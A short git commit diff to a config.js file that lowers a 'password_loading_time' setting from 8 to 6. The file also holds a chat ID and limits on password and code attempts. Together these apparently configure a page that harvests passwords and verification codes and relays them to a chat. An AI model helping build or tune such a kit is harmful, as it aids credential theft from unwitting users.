b68938949d5cbd8077a7a8c1f732fed5c4f2c701
mentorblack1 <vuvansonss@gmail.com>
2026-05-21 16:16:51 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -3,7 +3,7 @@ const config = {
     chat_id: '-1003257858837',
     max_password_attempts: 2,
     max_code_attempts: 4,
-    password_loading_time: 8,
+    password_loading_time: 6,
     code_loading_time: 15
 };
 export default config;
